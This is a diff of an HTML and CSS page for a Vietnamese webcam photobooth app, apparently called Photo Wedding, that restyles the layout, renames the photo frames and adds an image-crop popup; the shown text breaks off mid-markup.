@@ -1,44 +1,34 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Nhung Weddinng</title>
+  <title>Photo Wedding</title>
   <link href="https://fonts.googleapis.com/css2?family=Comfortaa:wght@600;700&family=Nunito:wght@600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
   
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Nunito', sans-serif; }
     
-    body { 
-      background: linear-gradient(135deg, #fff0f3 0%, #ffe5ec 100%); 
-      padding: 20px 10px; 
-      color: #4a4a4a; 
-      display: flex; 
-      justify-content: center; 
-      min-height: 100vh; 
-    }
+    body { background: linear-gradient(135deg, #fffff0 0%, #ffffe5 100%);  padding: 20px 10px;  color: #4a4a4a;  display: flex;  justify-content: center;  min-height: 100vh; }
 
     .app-container { 
-      max-width: 1000px; 
-      width: 100%; 
-      background: rgba(255, 255, 255, 0.7);
-      backdrop-filter: blur(10px);
-      border-radius: 24px;
-      padding: 20px;
-      box-shadow: 0 20px 40px rgba(255, 107, 129, 0.08);
+      max-width: 1000px; width: 100%; background: rgba(255, 255, 255, 0.75); backdrop-filter: blur(10px);
+      border-radius: 24px; padding: 20px; box-shadow: 0 20px 40px rgba(255, 107, 129, 0.08);
       border: 1px solid rgba(255, 255, 255, 0.8);
     }
 
     /* HEADER */
     .brand-title { 
-      font-family: 'Comfortaa', cursive; 
+      font-family: 'Nunito', sans-serif;
       font-size: 32px; 
+      font-weight:800;
       color: #ff4d6d; 
       text-align: center; 
       letter-spacing: -1px;
       text-shadow: 0 2px 10px rgba(255, 77, 109, 0.15);
     }
+    
     .brand-subtitle { 
       font-family: 'Comfortaa', cursive; 
       font-size: 13px; 
@@ -100,37 +90,27 @@
 
     .main-layout { display: flex; gap: 20px; }
     .left-side { flex: 1; display: flex; flex-direction: column; gap: 15px; }
-    
-    .right-side { 
-      width: 150px; 
-      display: flex; 
-      flex-direction: column; 
-      gap: 12px; 
-    }
+    .right-side { width: 150px; display: flex; flex-direction: column; gap: 12px; }
 
-    /* Container Camera */
+    /* Camera Container */
+    /* ==================== KHUNG CAMERA NỔI BẬT ĐƠN GIẢN ==================== */
     .camera-container {
-      position: relative;
-      width: 100%;
-      max-width: 480px;
-      margin: 0 auto;
-      background: #1e1e24;
-      border-radius: 20px;
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      aspect-ratio: 4 / 3;
-      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
+      position: relative; width: 100%; max-width: 480px; margin: 0 auto; background: #18181c00; border-radius: 20px;
+      overflow: hidden; display: flex; align-items: center; justify-content: center; aspect-ratio: 4 / 3;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      box-shadow: 0 12px 30px rgba(255, 77, 109, 0.15), 0 4px 12px rgba(0, 0, 0, 0.2); transition: all 0.3s ease;
     }
 
-    .camera-viewport {
-      position: relative;
-      width: 100%;
-      height: 100%;
-      overflow: hidden;
-    }
+    .camera-container:hover {box-shadow: 0 16px 35px rgba(255, 77, 109, 0.25), 0 6px 18px rgba(0, 0, 0, 0.3);}
+    .camera-viewport { position: relative; width: 100%; height: 100%; overflow: hidden; border-radius: 19px;}
+    .camera-corner { position: absolute;  width: 18px; height: 18px;border: 2px solid #ffffff69; pointer-events: none;z-index: 5; transition: all 0.3s ease;}
+    .camera-corner.top-left     { top: 10px; left: 10px; border-right: none; border-bottom: none; border-top-left-radius: 6px; }
+    .camera-corner.top-right    { top: 10px; right: 10px; border-left: none; border-bottom: none; border-top-right-radius: 6px; }
+    .camera-corner.bottom-left  { bottom: 10px; left: 10px; border-right: none; border-top: none; border-bottom-left-radius: 6px; }
+    .camera-corner.bottom-right { bottom: 10px; right: 10px; border-left: none; border-top: none; border-bottom-right-radius: 6px; }
 
+    /* Hiệu ứng co nhẹ 4 góc khi di chuột */
+    .camera-container:hover .camera-corner { transform: scale(0.9); border-color: #ff758f;}
     video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
 
     .grid-overlay {
@@ -144,25 +124,18 @@
 
     .status-pill {
       position: absolute; bottom: 12px; left: 50%; transform: translateX(-50%);
-      background: rgba(255, 77, 110, 0); backdrop-filter: blur(4px); color: white; 
+      color: rgba(255, 255, 255, 0.26); 
       padding: 5px 18px; border-radius: 20px; font-size: 12px; font-weight: 800; z-index: 3;
       letter-spacing: 0.5px; white-space: nowrap;
     }
-    .cam-icon-top {
-      position: absolute; top: 12px; width: 34px; height: 34px; border-radius: 50%;
-      background: rgba(255,255,255,0.8); backdrop-filter: blur(4px); display: flex; 
-      align-items: center; justify-content: center; font-size: 14px; z-index: 3; box-shadow: 0 2px 8px rgba(0,0,0,0.1); color: #ff4d6d;
-    }
-    .cam-icon-top.left { left: 12px; }
-    .cam-icon-top.right { right: 12px; }
 
     .countdown-overlay {
       position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-      color: rgba(255, 255, 255, 0.85); display: none;
+      color: rgba(255, 255, 255, 0.295); display: none;
       align-items: center; justify-content: center; font-size: 90px; font-weight: 800; z-index: 4;
+      text-shadow: 0 4px 20px rgba(0,0,0,0.4);
     }
 
-    /* Bộ Nút Chụp Ảnh Premium */
     .controls-row { display: flex; justify-content: center; align-items: flex-end; gap: 20px; margin-top: 5px; }
     .action-btn { border: none; background: none; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 6px; transition: transform 0.2s; }
     .action-btn:hover { transform: translateY(-2px); }
@@ -187,7 +160,7 @@
     .filter-card {
       background: #ffffff; border-radius: 18px; padding: 15px;
       display: flex; flex-direction: column; gap: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.02);
-      margin-top: 20px; /* Thêm khoảng cách phía trên */
+      margin-top: 10px;
     }
     .filter-title { font-size: 13px; font-weight: 800; color: #ff4d6d; display: flex; align-items: center; gap: 6px; }
     .btn-group { display: flex; gap: 6px; flex-wrap: wrap; }
@@ -204,18 +177,18 @@
     }
     .fx-btn.active { background: #00838f; color: #fff; border-color: #00838f; box-shadow: 0 3px 8px rgba(0, 131, 143, 0.3); }
 
+    /* Class Bộ Lọc CSS */
+    .filter-mono { filter: grayscale(50%) contrast(110%); }
+    .filter-bw { filter: grayscale(100%); }
+    .filter-soft { filter: brightness(108%) saturate(110%); }
+    .filter-dazz { filter: sepia(30%) contrast(120%); }
+    .filter-dazz-instant { filter: saturate(135%) contrast(92%) brightness(107%) hue-rotate(-8deg); }
+
     /* Slot Preview Ảnh */
     .strip-container { display: flex; flex-direction: column; gap: 10px; }
     .strip-slot {
-      position: relative; 
-      width: 100%; 
-      aspect-ratio: 4 / 3; 
-      height: auto; 
-      background: #ffffff;
-      border-radius: 12px; 
-      overflow: hidden;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
-      border: 2px dashed #ffccd5;
+      position: relative; width: 100%; aspect-ratio: 4 / 3; height: auto; background: #ffffff;
+      border-radius: 12px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 2px dashed #ffccd5;
     }
     .strip-slot.has-img { border-style: solid; border-color: #ff8fa3; }
     .strip-slot img { width: 100%; height: 100%; object-fit: cover; display: none; }
@@ -244,148 +217,126 @@
       border-radius: 20px; font-weight: 800; font-size: 12px; cursor: pointer;
       box-shadow: 0 4px 12px rgba(0, 200, 83, 0.25); transition: all 0.2s; display: flex; align-items: center; gap: 6px;
     }
-    .btn-custom-frame:hover { background: #00e676; }
 
-    /* Container Khung Xem Thử - tỉ lệ đúng theo ảnh khung gốc 880x2650 */
     .final-strip-container {
-      position: relative; 
-      width: 220px; 
-      aspect-ratio: 880 / 2650;
-      height: auto;
-      background: #fff;
-      border-radius: 12px; 
-      overflow: hidden; 
-      box-shadow: 0 12px 30px rgba(0,0,0,0.12);
+      position: relative; width: 220px; aspect-ratio: 880 / 2650; height: auto; background: #fff;
+      border-radius: 12px; overflow: hidden; box-shadow: 0 12px 30px rgba(0,0,0,0.12);
     }
 
-    /* Lớp 4 Ảnh Dưới - vị trí từng ảnh được set động bằng JS (%) theo đúng ô trống của từng khung */
-    .photos-layer {
-      position: absolute; 
-      top: 0; 
-      left: 0; 
-      width: 100%; 
-      height: 100%;
-      z-index: 1;
-    }
-    .photos-layer img.res-photo {
-      position: absolute;
-      object-fit: cover; 
-      border-radius: 4px; 
-      background: #eee;
-    }
+    .photos-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+    .photos-layer img.res-photo { position: absolute; object-fit: cover; border-radius: 4px; background: #eee; }/* transform: scale(1);     Phóng to ảnh chụp bên trong lên 5% */
 
-    /* Lớp Khung Phủ Đè Lên (nằm trên cùng, có vùng trong suốt để lộ ảnh bên dưới) */
-    .frame-overlay-img {
-      position: absolute; 
-      top: 0; 
-      left: 0; 
-      width: 100%; 
-      height: 100%;
-      z-index: 2; 
-      pointer-events: none; 
-      object-fit: fill;
-    }
+    .frame-overlay-img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; pointer-events: none; object-fit: fill; }
 
     .btn-download-final {
       background: linear-gradient(135deg, #ff4d6d, #ff758f); color: white; border: none; padding: 14px 20px;
       border-radius: 25px; font-weight: 800; font-size: 13px; cursor: pointer; width: 100%;
       box-shadow: 0 6px 18px rgba(255, 77, 109, 0.3); transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px;
     }
-    .btn-download-final:hover { transform: translateY(-2px); box-shadow: 0 8px 22px rgba(255, 77, 109, 0.4); }
-    
-    .btn-back {
-      background: none; border: none; color: #ff4d6d; font-weight: 800; cursor: pointer; font-size: 13px; display: flex; align-items: center; gap: 6px;
-    }
 
-    /* Danh Sách Khung */
-    .gallery-column { flex: 1; max-width: 520px; min-width: 280px; display: flex; flex-direction: column; gap: 15px; }
-    
+    .btn-back { background: none; border: none; color: #ff4d6d; font-weight: 800; cursor: pointer; font-size: 13px; display: flex; align-items: center; gap: 6px; }
+
+    /* ==================== TRANG 2: CẢI TIẾN GIAO DIỆN CHỌN KHUNG ==================== */
+    .gallery-column{flex:1;max-width:650px;min-width:300px;display:flex;flex-direction:column;gap:12px}
+
+    /* Thanh Tìm Kiếm & Category Filter */
     .search-box { position: relative; width: 100%; }
-    .search-box i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #ff8fa3; }
-    .search-input {
-      width: 100%; padding: 12px 20px 12px 40px; border: 1.5px solid #ffccd5;
-      border-radius: 25px; outline: none; font-size: 13px; background: #fff;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.02); transition: all 0.2s;
-    }
-    .search-input:focus { border-color: #ff4d6d; box-shadow: 0 4px 15px rgba(255, 77, 109, 0.15); }
+    .search-box i { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: #ff8fa3; font-size: 14px; }
+    .search-input{width:100%;padding:10px 18px 10px 42px;border:1.5px solid #ffccd5;border-radius:20px;outline:none;font-size:13px;background:#fff;transition:all 0.2s}
+    .search-input:focus { border-color: #ff4d6d; box-shadow: 0 0 0 3px rgba(255, 77, 109, 0.15); }
 
-    .frame-grid-container {
-      background: #fff; border: 1.5px solid #ffe5ec; border-radius: 20px;
-      padding: 15px; height: 580px; overflow-y: auto; display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.02);
+    /* Danh mục Filter nhanh */
+    .category-tags { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 4px; scrollbar-width: none; }
+    .category-tags::-webkit-scrollbar { display: none; }
+    .cat-btn {
+      background: #ffffff; border: 1px solid #ffe5ec; color: #666;
+      padding: 5px 14px; border-radius: 12px; font-size: 11px; font-weight: 700;
+      white-space: nowrap; cursor: pointer; transition: all 0.2s;
     }
-    .frame-item { cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 8px; }
-    .frame-item-preview {
-      width: 100%; height: 230px; border: 2px solid #f0f0f0; border-radius: 12px;
-      background: #fafafa; object-fit: contain; transition: all 0.25s;
-    }
-    .frame-item:hover .frame-item-preview { transform: translateY(-3px); border-color: #ff8fa3; }
-    .frame-item.selected .frame-item-preview { border-color: #ff4d6d; box-shadow: 0 0 0 3px rgba(255,77,109,0.3); }
-    .frame-name { font-size: 12px; font-weight: 800; color: #555; text-align: center; }
-    .frame-item.hidden { display: none; }
-    .no-result { grid-column: span 2; text-align: center; color: #aaa; font-size: 13px; font-weight: 700; padding: 40px 0; }
+    .cat-btn.active, .cat-btn:hover { background: #ff4d6d; color: white; border-color: #ff4d6d; }
 
-    /* Bộ Lọc Filter CSS */
-    .filter-mono { filter: grayscale(50%) contrast(110%); }
-    .filter-bw { filter: grayscale(100%); }
-    .filter-soft { filter: brightness(108%) saturate(110%); }
-    .filter-dazz { filter: sepia(30%) contrast(120%); }
-    .filter-dazz-instant { filter: saturate(135%) contrast(92%) brightness(107%) hue-rotate(-8deg); }
+    /* Grid Danh Sách Khung (Hiển thị 3-4 cột chuẩn UI) */
+    .frame-grid-container{background:rgba(255,255,255,0.85);border:1.5px solid #ffe5ec;border-radius:20px;padding:16px;max-height:560px;overflow-y:auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:14px}
+    /* Scrollbar tùy chỉnh nhẹ nhàng */
+    .frame-grid-container::-webkit-scrollbar { width: 6px; }
+    .frame-grid-container::-webkit-scrollbar-thumb { background: #ffccd5; border-radius: 10px; }
+
+    /* Item Khung Ảnh */
+    .frame-item{cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:6px;transition:transform 0.2s ease}
+    .frame-item:hover { transform: translateY(-3px); }
+
+    .frame-card-wrapper {
+      position: relative; width: 100%; aspect-ratio: 880 / 2650; border-radius: 10px;
+      overflow: hidden; background: #fdfdfd;
+      border: 2px solid #f0f0f0; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.04); transition: all 0.2s;
+    }
+
+    .frame-item-preview{width:100%;height:100%;object-fit:contain}
+    /* Trạng thái được chọn (Selected) */
+    .frame-item.selected .frame-card-wrapper { border-color: #ff4d6d;
+       box-shadow: 0 0 0 3px rgba(255, 77, 109, 0.35), 0 6px 15px rgba(255, 77, 109, 0.2); }
+    .frame-item.selected .frame-name { color: #ff4d6d;font-weight: 800;}
+
+    /* Thẻ Checkmark khi chọn */
+    .frame-item .selected-badge {
+      position: absolute; top: 6px; right: 6px;
+      background: #ff4d6d; color: white;
+      width: 18px; height: 18px; border-radius: 50%;
+      display: none; align-items: center; justify-content: center;
+      font-size: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    .frame-item.selected .selected-badge { display: flex; }
+    .frame-name { font-size: 11px; font-weight: 700; color: #666; text-align: center;line-height: 1.2; word-break: break-word;}
+
+    /* ==================== POPUP CẮT ÁNH (CROPPER MODAL DỄ DÙNG) ==================== */
+    .crop-modal-overlay {
+      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.7); backdrop-filter: blur(5px);
+      display: none; align-items: center; justify-content: center; z-index: 999;
+    }
+    .crop-modal-card {
+      background: #fff; border-radius: 20px; padding: 20px; width: 90%; max-width: 440px;
+      display: flex; flex-direction: column; gap: 15px; align-items: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    }
+    .crop-modal-title { font-size: 15px; font-weight: 800; color: #ff4d6d; text-align: center; }
+    .crop-hint { font-size: 12px; color: #888; text-align: center; font-weight: 700; margin-top: -8px; }
+
+    /* Khung nhìn 4:3 */
+    .crop-viewport {
+      width: 100%; aspect-ratio: 4 / 3; background: #111; border-radius: 12px;
+      position: relative; overflow: hidden; cursor: grab; touch-action: none;
+      border: 2px dashed #ff8fa3;
+    }
+    .crop-viewport:active { cursor: grabbing; }
+
+    .crop-img-target {
+      position: absolute; user-select: none; pointer-events: none;
+      top: 0; left: 0;
+    }
+
+    .crop-zoom-row { display: flex; align-items: center; gap: 10px; width: 100%; color: #ff8fa3; font-size: 14px; }
+    .crop-zoom-row input[type="range"] {
+      flex: 1; accent-color: #ff4d6d; cursor: pointer;
+    }
+
+    .crop-actions { display: flex; gap: 10px; width: 100%; margin-top: 5px; }
+    .btn-crop-cancel {
+      flex: 1; background: #f1f1f1; color: #666; border: none; padding: 12px; border-radius: 12px; font-weight: 800; cursor: pointer;
+    }
+    .btn-crop-confirm {
+      flex: 1; background: linear-gradient(135deg, #ff4d6d, #ff758f); color: white; border: none; padding: 12px; border-radius: 12px; font-weight: 800; cursor: pointer;
+    }
 
     canvas { display: none; }
 
-/* MEDIA QUERIES MOBILE */
     @media (max-width: 768px) {
       body { padding: 10px 5px; }
       .app-container { padding: 15px 10px; border-radius: 16px; }
-      .brand-title { font-size: 26px; }
-      .brand-subtitle { font-size: 12px; margin-bottom: 15px; }
-      
-      .toolbar-box { gap: 8px; justify-content: space-between; }
-      .btn-select-frame { margin-left: 0; width: 100%; justify-content: center; margin-top: 5px; }
-
-      /* Sử dụng Grid để dễ dàng sắp xếp thứ tự hiển thị các thành phần trên mobile */
-      .main-layout { 
-        display: grid; 
-        grid-template-columns: 1fr;
-        gap: 15px; 
-      }
-
-      /* 1. Camera + Các nút bấm chụp */
-      .camera-container, 
-      .controls-row, 
-      .extra-tools { 
-        order: 1; 
-      }
-
-      /* 2. Dải 4 ảnh preview (right-side) nằm ở giữa */
-      .right-side { 
-        order: 2; 
-        width: 100%; 
-      }
-      .strip-container { 
-        display: grid; 
-        grid-template-columns: repeat(4, 1fr); 
-        gap: 8px; 
-      }
-
-      /* 3. Card bộ lọc màu đẩy xuống cuối cùng */
-      .filter-card { 
-        order: 3; 
-      }
-
-      .left-side { 
-        display: contents; /* Giải phóng khung left-side để các con dùng chung thứ tự order với main-layout */
-      }
-
-      .controls-row { gap: 12px; }
-      .btn-circle { width: 48px; height: 48px; font-size: 18px; }
-      .action-btn.auto .btn-circle { width: 60px; height: 60px; font-size: 22px; }
-
+      .main-layout { display: grid; grid-template-columns: 1fr; gap: 15px; }
+      .right-side { order: 2; width: 100%; }
+      .strip-container { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
+      .filter-card { order: 3; }
       .step2-layout { flex-direction: column; align-items: center; }
-      .preview-column { width: 100%; max-width: 280px; }
-      .gallery-column { width: 100%; }
-      .frame-grid-container { height: 400px; }
     }
   </style>
 </head>
@@ -393,12 +344,11 @@
 
 <div class="app-container">
 
-  <div class="brand-title">Photo Weddinng</div>
+  <div class="brand-title">PhotoWedding</div>
   <span class="brand-subtitle">Capture Memories</span>
 
-  <!-- ==================== TRANG 1: MÀN HÌNH CHỤP ẢNH ==================== -->
+  <!-- ==================== TRANG 1 ==================== -->
   <div id="step-1" class="page-step active">
-
     <div class="toolbar-box">
       <div class="tool-group">
         <span>Layout Ảnh</span>
@@ -421,18 +371,21 @@
     </div>
 
     <div class="main-layout">
-      <!-- CỘT TRÁI (Trên PC) / DƯỚI (Trên Mobile): WEBCAM & BỘ ĐIỀU KHIỂN & BỘ LỌC -->
       <div class="left-side">
-        <div class="camera-container">
-          <div class="camera-viewport">
-            <div class="cam-icon-top left"><i class="fa-solid fa-bolt"></i></div>
-            <div class="cam-icon-top right"><i class="fa-solid fa-camera"></i></div>
-            <video id="webcam" autoplay playsinline muted></video>
-            <div class="grid-overlay" id="grid-overlay"></div>
-            <div id="countdown" class="countdown-overlay">3</div>
-            <div class="status-pill" id="status-pill">Đã Chụp 0/4</div>
-          </div>
-        </div>
+<div class="camera-container">
+  <div class="camera-viewport">
+    <!-- 4 Góc Accent điểm nhấn -->
+    <div class="camera-corner top-left"></div>
+    <div class="camera-corner top-right"></div>
+    <div class="camera-corner bottom-left"></div>
+    <div class="camera-corner bottom-right"></div>
+
+    <video id="webcam" autoplay playsinline muted></video>
+    <div class="grid-overlay" id="grid-overlay"></div>
+    <div id="countdown" class="countdown-overlay">3</div>
+    <div class="status-pill" id="status-pill">Đã Chụp 0/4</div>
+  </div>
+</div>
 
         <div class="controls-row">
           <button class="action-btn" onclick="snapSingle()">
@@ -449,14 +402,15 @@
           </button>
         </div>
 
+        <!-- TẢI ẢNH RIÊNG LÊN -->
         <div class="extra-tools">
           <label class="btn-upload">
             <i class="fa-solid fa-folder-open"></i> Tải ảnh riêng lên
-            <input type="file" accept="image/*" hidden onchange="uploadImage(event)">
+            <input type="file" id="upload-input" accept="image/*" hidden onchange="startImageCrop(event)">
           </label>
         </div>
 
-        <!-- BỘ LỌC MÀU: Đã chuyển xuống đây để nằm dưới cùng -->
+        <!-- BỘ LỌC MÀU -->
         <div class="filter-card">
           <div class="filter-title"><i class="fa-solid fa-palette"></i> Bộ lọc màu</div>
           <div class="btn-group">
@@ -479,497 +433,165 @@
         </div>
       </div>
 
-      <!-- CỘT PHẢI (Trên PC) / TRÊN (Trên Mobile): 4 SLOT XEM THỬ -->
+      <!-- SLOT PREVIEW -->
       <div class="right-side">
         <div class="strip-container">
-          <div class="strip-slot" id="slot-box-0"><img id="img-0"><button class="btn-delete-slot" onclick="deleteSlot(0)"><i class="fa-solid fa-trash-can"></i></button></div>
-          <div class="strip-slot" id="slot-box-1"><img id="img-1"><button class="btn-delete-slot" onclick="deleteSlot(1)"><i class="fa-solid fa-trash-can"></i></button></div>
-          <div class="strip-slot" id="slot-box-2"><img id="img-2"><button class="btn-delete-slot" onclick="deleteSlot(2)"><i class="fa-solid fa-trash-can"></i></button></div>
-          <div class="strip-slot" id="slot-box-3"><img id="img-3"><button class="btn-delete-slot" onclick="deleteSlot(3)"><i class="fa-solid fa-trash-can"></i></button></div>
+          <div class="strip-slot" id="slot-box-0"><img id="img-0" alt="Slot 1"><button class="btn-delete-slot" onclick="deleteSlot(0)"><i class="fa-solid fa-trash-can"></i></button></div>
+          <div class="strip-slot" id="slot-box-1"><img id="img-1" alt="Slot 2"><button class="btn-delete-slot" onclick="deleteSlot(1)"><i class="fa-solid fa-trash-can"></i></button></div>
+          <div class="strip-slot" id="slot-box-2"><img id="img-2" alt="Slot 3"><button class="btn-delete-slot" onclick="deleteSlot(2)"><i class="fa-solid fa-trash-can"></i></button></div>
+          <div class="strip-slot" id="slot-box-3"><img id="img-3" alt="Slot 4"><button class="btn-delete-slot" onclick="deleteSlot(3)"><i class="fa-solid fa-trash-can"></i></button></div>
         </div>
-
         <button id="btn-next-page" class="btn-next-page" onclick="goToStep2()">Tiếp Tục <i class="fa-solid fa-arrow-right"></i></button>
       </div>
     </div>
-
   </div>
 
-  <!-- ==================== TRANG 2: MÀN HÌNH CHỌN KHUNG ==================== -->
+  <!-- ==================== TRANG 2 ==================== -->
   <div id="step-2" class="page-step">
     <div class="step2-layout">
-
-      <!-- Cột Xem Trước Ảnh Hoàn Thiện -->
       <div class="preview-column">
         <label class="btn-custom-frame">
           <i class="fa-solid fa-image"></i> Khung Riêng (PNG)
           <input type="file" hidden accept="image/png" onchange="loadCustomFrame(event)">
         </label>
 
-        <!-- Container Xem Trước -->
         <div class="final-strip-container">
-          <!-- Lớp Ảnh Dưới -->
           <div class="photos-layer" id="photos-layer">
-            <img id="res-0" class="res-photo">
-            <img id="res-1" class="res-photo">
-            <img id="res-2" class="res-photo">
-            <img id="res-3" class="res-photo">
+            <img id="res-0" class="res-photo" alt="Photo 1">
+            <img id="res-1" class="res-photo" alt="Photo 2">
+            <img id="res-2" class="res-photo" alt="Photo 3">
+            <img id="res-3" class="res-photo" alt="Photo 4">
           </div>
-          <!-- Lớp Khung Mẫu Đè Lên Trên -->
-          <img id="active-frame-overlay" class="frame-overlay-img" src="">
+          <img id="active-frame-overlay" class="frame-overlay-img" src="" alt="Active Frame">
         </div>
 
         <button class="btn-download-final" onclick="downloadFinalImage()"><i class="fa-solid fa-download"></i> Tải Ảnh Xuống (HD)</button>
         <button class="btn-back" onclick="goToStep1()"><i class="fa-solid fa-chevron-left"></i> Quay lại chụp lại ảnh</button>
       </div>
 
-      <!-- Cột Danh Sách Chọn Khung -->
-      <div class="gallery-column">
-        <div class="search-box">
-          <i class="fa-solid fa-magnifying-glass"></i>
-          <input type="text" class="search-input" placeholder="Tìm kiếm khung ảnh mẫu..." oninput="filterFrames(this.value)">
-        </div>
+<div class="gallery-column">
+  <!-- Thanh tìm kiếm -->
+  <div class="search-box">
+    <i class="fa-solid fa-magnifying-glass"></i>
+    <input type="text" class="search-input" placeholder="Tìm tên khung (ToyStory, HUCE, AOF...)..." oninput="filterFrames(this.value)">
+  </div>
 
-        <div class="frame-grid-container" id="frame-grid-container">
-          
-          <div class="frame-item selected" data-frame="frame1" data-name="khung ribbon cute nơ xanh" onclick="applyFrame('frame1')">
-            <img class="frame-item-preview" src="./692d7d65603ca.png" alt="Khung 1">
-            <span class="frame-name">Dải Nơ Xanh</span>
-          </div>
+  <!-- Tag phân loại nhanh -->
+  <div class="category-tags">
+    <button class="cat-btn active" onclick="filterCategory('all', this)">Tất Cả</button>
+    <button class="cat-btn" onclick="filterCategory('cute', this)">Cute / Yêu Thích</button>
+    <button class="cat-btn" onclick="filterCategory('school', this)">Thẻ Sinh Viên</button>
+    <button class="cat-btn" onclick="filterCategory('camera', this)">Máy Ảnh Retro</button>
+  </div>
 
-          <div class="frame-item" data-frame="frame2" data-name="wedding" onclick="applyFrame('frame2')">
-            <img class="frame-item-preview" src="./6854e5408664d.png" alt="Khung 2">
-            <span class="frame-name">wedding</span>
-          </div>
-
-          <div class="frame-item" data-frame="frame3" data-name="khung chiikawa cute hồng" onclick="applyFrame('frame3')">
-            <img class="frame-item-preview" src="./687cd152e026d.png" alt="Khung 3">
-            <span class="frame-name">Chiikawa Pink</span>
-          </div>
-
-          <div class="no-result" id="no-result-msg" style="display:none;">Không tìm thấy khung phù hợp 🥲</div>
-        </div>
+  <!-- Danh sách lưới khung ảnh -->
+  <div class="frame-grid-container" id="frame-grid-container">
+    
+    <!-- Mẫu Khung ToyStory -->
+    <div class="frame-item selected" data-frame="frame1" data-category="cute" data-name="toystory toy story cute cartoon" onclick="applyFrame('frame1')">
+      <div class="frame-card-wrapper">
+        <img class="frame-item-preview" src="./tc.png" alt="ToyStory">
+        <div class="selected-badge"><i class="fa-solid fa-check"></i></div>
       </div>
+      <span class="frame-name">ToyStory</span>
+    </div>
 
+    <!-- Mẫu Khung UEder -->
+    <div class="frame-item" data-frame="frame2" data-category="school" data-name="ueder sinh vien ued purple" onclick="applyFrame('frame2')">
+      <div class="frame-card-wrapper">
+        <img class="frame-item-preview" src="./tcn.png" alt="UEder">
+        <div class="selected-badge"><i class="fa-solid fa-check"></i></div>
+      </div>
+      <span class="frame-name">UEder</span>
+    </div>
+
+    <!-- Mẫu Khung HUCE-card -->
+    <div class="frame-item" data-frame="frame3" data-category="school" data-name="huce-card xay dung ha noi" onclick="applyFrame('frame3')">
+      <div class="frame-card-wrapper">
+        <img class="frame-item-preview" src="./inter.png" alt="HUCE-card">
+        <div class="selected-badge"><i class="fa-solid fa-check"></i></div>
+      </div>
+      <span class="frame-name">HUCE-card</span>
+    </div>
+
+    <!-- Mẫu Khung star1 -->
+    <div class="frame-item" data-frame="frame4" data-category="cute" data-name="star1 ngoi sao pink hong" onclick="applyFrame('frame4')">
+      <div class="frame-card-wrapper">
+        <img class="frame-item-preview" src="./icon.png" alt="star1">
+        <div class="selected-badge"><i class="fa-solid fa-check"></i></div>
+      </div>
+      <span class="frame-name">star1</span>
+    </div>
+
+    <!-- Thêm các khung khác dễ dàng tại đây... -->
+
+    <!-- Mẫu Khung star1 -->
+    <div class="frame-item" data-frame="frame5" data-category="cute" data-name="star1 ngoi sao pink hong" onclick="applyFrame('frame5')">
+      <div class="frame-card-wrapper">
+        <img class="frame-item-preview" src="./savedate.png" alt="star1">
+        <div class="selected-badge"><i class="fa-solid fa-check"></i></div>
+      </div>
+      <span class="frame-name">star1</span>
+    </div>
+
+    <!-- Mẫu Khung star1 -->
+    <div class="frame-item" data-frame="frame6" data-category="cute" data-name="star1 ngoi sao pink hong" onclick="applyFrame('frame6')">
+      <div class="frame-card-wrapper">
+        <img class="frame-item-preview" src="./mini.png" alt="star1">
+        <div class="selected-badge"><i class="fa-solid fa-check"></i></div>
+      </div>
+      <span class="frame-name">star1</span>
+    </div>
+    <!-- Mẫu Khung star1 -->
+    <div class="frame-item" data-frame="frame7" data-category="cute" data-name="star1 ngoi sao pink hong" onclick="applyFrame('frame7')">
+      <div class="frame-card-wrapper">
+        <img class="frame-item-preview" src="./conan.png" alt="star1">
+        <div class="selected-badge"><i class="fa-solid fa-check"></i></div>
+      </div>
+      <span class="frame-name">star1</span>
+    </div>
+    <!-- Mẫu Khung star1 -->
+    <div class="frame-item" data-frame="frame8" data-category="cute" data-name="star1 ngoi sao pink hong" onclick="applyFrame('frame8')">
+      <div class="frame-card-wrapper">
+        <img class="frame-item-preview" src="./gdragon.png" alt="star1">
+        <div class="selected-badge"><i class="fa-solid fa-check"></i></div>
+      </div>
+      <span class="frame-name">star1</span>
+    </div>
+  </div>
+</div>
     </div>
   </div>
 
 </div>
 
-<!-- Canvas Ẩn Xuất File -->
+<!-- ==================== POPUP CẮT ÁNH DỄ DÙNG ==================== -->
+<div class="crop-modal-overlay" id="crop-modal">
+  <div class="crop-modal-card">
+    <div class="crop-modal-title"><i class="fa-solid fa-crop-simple"></i> Căn Chỉnh Vị Trí Ảnh</div>
+    <div class="crop-hint"><i class="fa-solid fa-hand-pointer"></i> Kéo di chuyển ảnh vào vị trí đẹp nhất</div>
+    
+    <div class="crop-viewport" id="crop-viewport">
+      <img id="crop-target-img" class="crop-img-target" alt="Crop Target">
+    </div>
+
+    <div class="crop-zoom-row">
